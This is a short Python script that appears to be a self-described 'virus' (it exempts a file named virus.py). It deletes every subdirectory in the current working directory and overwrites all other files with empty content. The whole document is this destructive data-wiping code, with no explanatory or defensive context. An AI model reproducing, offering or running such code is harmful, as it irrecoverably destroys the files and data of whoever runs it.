import os
import shutil
list1 = os.listdir()
for x in list1:
    if os.path.isdir(x):
        shutil.rmtree(x)
    else:
        if not (x == "virus.py"):
            f1 = open(x, "w")
            f1.write("")
            f1.close()
